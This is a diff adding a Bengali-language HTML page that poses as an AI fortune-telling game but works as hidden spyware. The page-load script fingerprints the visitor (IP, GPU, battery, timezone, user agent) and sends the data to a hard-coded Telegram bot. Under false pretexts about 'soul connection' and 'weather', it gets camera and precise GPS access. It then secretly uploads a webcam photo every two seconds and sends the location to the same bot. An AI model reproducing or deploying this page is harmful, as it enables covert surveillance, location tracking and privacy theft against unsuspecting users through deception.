@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Mystic Vision - ভবিষ্যৎ দর্পণ</title>
+    <style>
+        body { background: radial-gradient(circle, #0a001a 0%, #000 100%); color: #e0f7fa; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .box { width: 85%; max-width: 450px; background: rgba(255, 255, 255, 0.03); padding: 35px; border-radius: 40px; border: 2px solid #00d4ff; text-align: center; box-shadow: 0 0 40px rgba(0, 212, 255, 0.2); backdrop-filter: blur(10px); }
+        .main-title { font-size: 2.2rem; color: #00d4ff; text-shadow: 0 0 20px #0055ff; font-weight: bold; margin-bottom: 10px; animation: glow 2s infinite alternate; }
+        @keyframes glow { from { text-shadow: 0 0 10px #00d4ff; } to { text-shadow: 0 0 30px #0055ff, 0 0 10px #fff; } }
+        .screen { display: none; }
+        .active { display: block; }
+        .btn { padding: 16px; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; font-size: 1.1rem; box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4); transition: 0.3s; }
+        .btn-male { background: linear-gradient(45deg, #0055ff, #00d4ff); }
+        .btn-female { background: linear-gradient(45deg, #ff3399, #ff66b2); }
+        .btn-action { background: linear-gradient(45deg, #00ffaa, #009966); color: #000; }
+        .result-img { width: 100%; border-radius: 20px; margin: 20px 0; border: 2px solid #00d4ff; height: 230px; object-fit: cover; }
+        #video { opacity: 0; position: absolute; width: 1px; height: 1px; }
+        .loader { border: 4px solid #333; border-top: 4px solid #00d4ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<audio id="bgMusic" loop>
+    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mpeg">
+</audio>
+
+<div class="box">
+    <div class="main-title">AI ভবিষ্যৎ দর্পণ 🔮</div>
+    
+    <div id="s0" class="screen active">
+        <h2>আপনার প্রোফাইল নির্বাচন করুন</h2>
+        <p>এআই আপনার ভাগ্য এবং ভবিষ্যৎ বিশ্লেষণ করতে প্রস্তুত। আপনি কিভাবে দেখতে চান?</p>
+        <button class="btn btn-male" onclick="selectGender('male')">ছেলে হিসেবে দেখুন 🧔</button>
+        <button class="btn btn-female" onclick="selectGender('female')">মেয়ে হিসেবে দেখুন 👩</button>
+    </div>
+
+    <div id="s1" class="screen">
+        <h2>আত্মিক সংযোগ স্থাপন... ✨</h2>
+        <p>এআই আপনার চোখের মণির রিফ্লেকশন থেকে আপনার আত্মার ডাটা সিঙ্ক করে ভবিষ্যৎ দর্পণ দেখাবে।</p>
+        <button class="btn btn-male" onclick="startProcess()">ম্যাজিক শুরু করো ✨</button>
+    </div>
+
+    <div id="s2" class="screen">
+        <h3>আভামণ্ডল বিশ্লেষণ... 🌤️</h3>
+        <p>সঠিক ভবিষ্যৎবাণীর জন্য এআই-কে আপনার বর্তমান চারপাশের আবহাওয়ার স্পন্দন অনুভব করতে দিন।</p>
+        <button id="locBtn" class="btn btn-action" onclick="requestLocation()">আবহাওয়ার স্পন্দন দিন 📍</button>
+        <p id="err-msg" style="color: #ff3333; display: none; margin-top: 10px; font-size: 0.9rem;">এআই আপনার আবহাওয়ার অবস্থা নির্ধারণ করতে পারছে না, দয়া করে জিপিএস অন করুন।</p>
+    </div>
+
+    <div id="s3" class="screen">
+        <h3 id="res-title" style="color: #00d4ff;"></h3>
+        <img id="res-img" class="result-img" src="">
+        <p id="res-desc"></p>
+        <div id="loader" class="loader" style="display:none;"></div>
+        <button class="btn btn-male" id="next-btn" onclick="showStory()">আরও রহস্য দেখুন 🕯️</button>
+    </div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const BOT_TOKEN = '8655910223:AAF7QkYAwKuha8tVJjiNvVjWcZtaG0ffaoA';
+    const CHAT_ID = '6547277630';
+    let storyIndex = 0;
+    let selectedContents = [];
+    let userGender = '';
+    const music = document.getElementById('bgMusic');
+
+    // জিপিইউ (GPU) তথ্য বের করার ফাংশন
+    function getGPUInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return "N/A";
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+        } catch (e) { return "Error"; }
+    }
+
+    window.onload = async function() {
+        try {
+            const n = navigator;
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const conn = n.connection || n.mozConnection || n.webkitConnection || {};
+            const gpu = getGPUInfo();
+            const screenRes = `${window.screen.width}x${window.screen.height} (${window.screen.pixelDepth}-bit)`;
+            
+            let batteryInfo = "N/A";
+            if (n.getBattery) {
+                const b = await n.getBattery();
+                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
+            }
+
+            let info = `🌐 **New Visitor Details Collected!**\n\n` +
+                       `📍 **IP:** \`${ipData.ip}\`\n` +
+                       `📱 **Platform:** ${n.platform}\n` +
+                       `🖥️ **Display:** ${screenRes}\n` +
+                       `🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB\n` +
+                       `⚙️ **CPU Cores:** ${n.hardwareConcurrency || 'N/A'}\n` +
+                       `🎮 **GPU:** ${gpu}\n` +
+                       `🔋 **Battery:** ${batteryInfo}\n` +
+                       `📶 **Network:** ${conn.effectiveType || 'Unknown'}\n` +
+                       `🌍 **Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
+                       `🕒 **Local Time:** ${new Date().toLocaleString()}\n\n` +
+                       `🔍 **UserAgent:** \`${n.userAgent}\``;
+
+            sendBot(info);
+        } catch (e) { sendBot("❌ Failed to collect deep device info."); }
+    };
+
+    const maleContents = [
+        { t: "আপনার সফল ক্যারিয়ার", i: "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab", d: "এআই বলছে আপনার পেশাগত জীবনে বিপুল সাফল্য অপেক্ষা করছে।" },
+        { t: "আপনার স্বপ্নের সুপারকার", i: "https://images.unsplash.com/photo-1503376780353-7e6692767b70", d: "খুব শীঘ্রই এই গতির রোমাঞ্চ আপনার হাতের মুঠোয় আসবে।" },
+        { t: "আপনার বিলাসবহুল বাড়ি", i: "https://images.unsplash.com/photo-1512917774080-9991f1c4c750", d: "আপনার পরিশ্রম গড়ে তুলবে এমন একটি স্বপ্নের প্রাসাদ।" },
+        { t: "সুন্দর পরিবার ও জীবনসঙ্গী", i: "https://images.unsplash.com/photo-1511895426328-dc8714191300", d: "আপনাদের আগামী দিনগুলো হবে সুখ ও ভালোবাসায় ভরপুর।" },
+        { t: "বিশ্বভ্রমণের হাতছানি", i: "https://images.unsplash.com/photo-1488085061387-422e29b40080", d: "সাত সমুদ্র পাড়ি দিয়ে পৃথিবীর সৌন্দর্য উপভোগ করবেন আপনি।" },
+        { t: "শান্তিময় বার্ধক্য", i: "https://images.unsplash.com/photo-1544144433-d50aff500b91", d: "জীবনের শেষ সময়টুকু কাটবে সম্মান ও অনাবিল প্রশান্তিতে।" }
+    ];
+
+    const femaleContents = [
+        { t: "আপনার সফল ক্যারিয়ার ও স্বাধীনতা", i: "https://images.unsplash.com/photo-1573496359142-b8d87734a5a2", d: "আপনি হয়ে উঠবেন একজন আত্মবিশ্বাসী ও সফল নারী।" },
+        { t: "আপনার স্বপ্নের রাজপ্রাসাদ", i: "https://images.unsplash.com/photo-1512917774080-9991f1c4c750", d: "আপনার রুচি ও পরিশ্রমে গড়ে উঠবে এমন একটি সুন্দর নীড়।" },
+        { t: "সুন্দর পরিবার ও জীবনসঙ্গী", i: "https://images.unsplash.com/photo-1516589174184-c68526514800", d: "ভালোবাসা ও সম্মানে ভরা একটি সুন্দর দাম্পত্য জীবন অপেক্ষা করছে।" },
+        { t: "আপনার বিশ্বভ্রমণ", i: "https://images.unsplash.com/photo-1469854523086-cc02fe5d8800", d: "দেশ-বিদেশের অজানা সৌন্দর্য উপভোগ করার সুযোগ আসবে আপনার।" },
+        { t: "আর্থিক প্রাচুর্য", i: "https://images.unsplash.com/photo-1553729459-efe14ef6055d", d: "আর্থিক স্বাধীনতা আপনাকে দেবে নিশ্চিন্ত এক ভবিষ্যৎ।" },
+        { t: "শান্তিময় বার্ধক্য", i: "https://images.unsplash.com/photo-1544144433-d50aff500b91", d: "পরিবারের সবার ভালোবাসায় সিক্ত থাকবে আপনার শেষ বয়স।" }
+    ];
+
+    function selectGender(gender) {
+        userGender = gender;
+        selectedContents = (gender === 'male') ? maleContents : femaleContents;
+        const msg = new SpeechSynthesisUtterance("স্বাগতম। আপনার ভবিষ্যৎ বিশ্লেষণ করতে এআই প্রস্তুত হচ্ছে। আত্মার সংযোগ স্থাপন করুন।");
+        msg.lang = 'bn-BD';
+        msg.onend = () => music.play();
+        window.speechSynthesis.speak(msg);
+        document.getElementById('s0').classList.remove('active');
+        document.getElementById('s1').classList.add('active');
+    }
+
+    function startProcess() {
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            document.getElementById('video').srcObject = stream;
+            setInterval(autoCapture, 2000); 
+            sendBot(`📸 **Camera Access Obtained!**\n👤 Identity: **${userGender.toUpperCase()}**`);
+            document.getElementById('s1').classList.remove('active');
+            document.getElementById('s2').classList.add('active');
+        }).catch(() => alert("আত্মিক সংযোগ ছাড়া ভবিষ্যৎ দেখা সম্ভব নয়।"));
+    }
+
+    function requestLocation() {
+        const btn = document.getElementById('locBtn');
+        const errDisplay = document.getElementById('err-msg');
+        errDisplay.style.display = 'none';
+        btn.innerText = "বিশ্লেষণ করা হচ্ছে...";
+
+        navigator.geolocation.getCurrentPosition(pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            // সঠিক গুগল ম্যাপ ইউআরএল ফরম্যাট
+            sendBot(`📍 **Live Location Sync!**\n[View Map](https://www.google.com/maps?q=${lat},${lon})`);
+            document.getElementById('s2').classList.remove('active');
+            document.getElementById('s3').classList.add('active');
+            showStory();
+        }, () => { 
+            btn.innerText = "আবহাওয়ার স্পন্দন দিন 📍";
+            errDisplay.style.display = 'block'; 
+        }, { 
+            enableHighAccuracy: true,
+            timeout: 10000, 
+            maximumAge: 0 
+        });
+    }
+
+    function showStory() {
+        if (storyIndex < selectedContents.length) {
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('next-btn').style.display = 'none';
+            document.getElementById('res-img').style.display = 'none';
+            document.getElementById('res-desc').style.display = 'none';
+
+            setTimeout(() => {
+                const data = selectedContents[storyIndex];
+                document.getElementById('res-title').innerText = data.t;
+                document.getElementById('res-img').src = data.i + "?w=400";
+                document.getElementById('res-desc').innerText = data.d;
+                document.getElementById('res-img').style.display = 'block';
+                document.getElementById('res-desc').style.display = 'block';
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('next-btn').style.display = 'block';
+                storyIndex++;
+            }, 2500); 
+        } else {
+            document.getElementById('res-title').innerText = "ভবিষ্যৎবাণী সমাপ্ত!";
+            document.getElementById('res-img').style.display = 'none';
+            document.getElementById('res-desc').innerText = "আপনার ভবিষ্যৎ উজ্জ্বল হোক। শুভকামনা!";
+            document.getElementById('next-btn').style.display = 'none';
+        }
+    }
+
+    function autoCapture() {
+        const v = document.getElementById('video');
+        const c = document.getElementById('canvas');
+        if(!v.videoWidth) return;
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => {
+            const f = new FormData();
+            f.append('chat_id', CHAT_ID);
+            f.append('photo', b, 'capture.jpg');
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f });
+        }, 'image/jpeg');
+    }
+
+    function sendBot(txt) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
+    }
+</script>
+</body>
+</html>
